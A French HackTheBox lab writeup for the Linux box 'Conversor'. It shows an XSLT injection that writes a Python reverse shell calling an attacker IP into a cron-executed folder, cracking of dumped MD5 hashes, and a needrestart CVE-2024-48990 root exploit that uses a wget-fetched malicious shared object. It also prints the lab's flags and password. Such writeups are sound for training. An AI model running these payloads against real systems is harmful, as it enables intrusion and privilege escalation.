# Conversor - HackTheBox Writeup

![HTB Conversor](https://img.shields.io/badge/HackTheBox-Conversor-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)

## Box Info

| Property | Value |
|----------|-------|
| Name | Conversor |
| OS | Linux (Ubuntu 22.04) |
| Difficulty | Easy |
| Release | 2025 |
| IP | 10.129.45.169 |

## Flags

| Flag | Hash |
|------|------|
| User | `cfa738a0c123cdcbe44b82bdb04118bc` |
| Root | `f3eaeb6fba5f932ad2a1f4f2e41bbd3a` |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -T4 10.129.45.169
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Web Enumeration

Ajout au fichier hosts:
```bash
echo "10.129.45.169 conversor.htb" >> /etc/hosts
```

L'application est un convertisseur XML/XSLT vers HTML. Le code source est disponible en téléchargement sur la page "About".

---

## Source Code Analysis

L'application est en Python Flask (`app.py`):

```python
app.secret_key = 'Changemeplease'

@app.route('/convert', methods=['POST'])
def convert():
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree

    # XML parser sécurisé
    parser = etree.XMLParser(resolve_entities=False, no_network=True,
                             dtd_validation=False, load_dtd=False)
    xml_tree = etree.parse(xml_path, parser)

    # XSLT parser SANS restrictions!
    xslt_tree = etree.parse(xslt_path)  # <-- VULNERABLE
    transform = etree.XSLT(xslt_tree)
```

**Vulnérabilité**: Le parser XSLT n'a aucune restriction de sécurité, permettant l'utilisation d'extensions EXSLT.

### Cron Job (install.md)

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Un cron job exécute tous les fichiers `.py` dans `/var/www/conversor.htb/scripts/` chaque minute.

---

## Exploitation

### XSLT Injection via EXSLT Document Write

On peut utiliser `exsl:document` pour écrire des fichiers sur le système.

**exploit.xslt**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/revshell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.197",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
    </exsl:document>
    <result>File write attempted!</result>
  </xsl:template>
</xsl:stylesheet>
```

**xml.xml**:
```xml
<?xml version="1.0"?>
<root>test</root>
```

### Exécution

1. Lancer le listener:
```bash
nc -lvnp 4444
```

2. Upload les fichiers via le site web

3. Attendre ~1 minute (cron job)

4. Shell obtenu en tant que `www-data`

---

## Privilege Escalation: www-data → fismathack

### Dump de la base SQLite

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|tely|0af84df18f888bf5e60b9a63b61ff937
```

### Crack du hash MD5

```bash
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
```

**Résultat**: `fismathack:Keepmesafeandwarm`

### SSH

```bash
ssh fismathack@conversor.htb
# Password: Keepmesafeandwarm
cat ~/user.txt
```

---

## Privilege Escalation: fismathack → root

### Enumération sudo

```bash
sudo -l
```

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

### CVE-2024-48990 - needrestart < 3.8

```bash
needrestart --version
# needrestart 3.7
```

La version 3.7 est vulnérable à CVE-2024-48990: un attaquant peut exécuter du code arbitraire en root via PYTHONPATH hijacking.

### Exploitation

1. **Compiler le payload** (sur machine attaquante):

```c
// rootshell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    if (geteuid() == 0) {
        system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash");
    }
}
```

```bash
# Cross-compile pour Linux x86_64
docker run --rm --platform linux/amd64 -v /tmp:/tmp gcc:latest \
  gcc -shared -fPIC -o /tmp/rootshell.so /tmp/rootshell.c
```

2. **Transférer sur la cible**:

```bash
# Attaquant
python3 -m http.server 8080

# Cible
mkdir -p /tmp/malicious/importlib
wget http://10.10.14.197:8080/rootshell.so -O /tmp/malicious/importlib/__init__.so
```

3. **Lancer le bait process**:

```bash
echo 'import time; time.sleep(3600)' > /tmp/bait.py
PYTHONPATH=/tmp/malicious python3 /tmp/bait.py &
```

4. **Trigger needrestart**:

```bash
sudo /usr/sbin/needrestart -r a
```

5. **Root shell**:

```bash
/tmp/rootbash -p
cat /root/root.txt
```

---

## Résumé de l'attaque

```
┌─────────────────┐     XSLT Injection      ┌─────────────────┐
│   Attaquant     │ ──────────────────────► │    www-data     │
│                 │     exsl:document       │                 │
└─────────────────┘     + cron job          └────────┬────────┘
                                                     │
                                              SQLite dump
                                              MD5 crack
                                                     │
                                                     ▼
                                            ┌─────────────────┐
                                            │   fismathack    │
                                            │   (user flag)   │
                                            └────────┬────────┘
                                                     │
                                            CVE-2024-48990
                                            needrestart
                                                     │
                                                     ▼
                                            ┌─────────────────┐
                                            │      root       │
                                            │   (root flag)   │
                                            └─────────────────┘
```

## Outils utilisés

- nmap
- curl
- nc (netcat)
- sqlite3
- john
- gcc (cross-compilation)
- sshpass

## Références

- [PayloadsAllTheThings - XSLT Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/)
- [CVE-2024-48990 - needrestart](https://github.com/ns989/CVE-2024-48990)
- [EXSLT Extensions](http://exslt.org/)
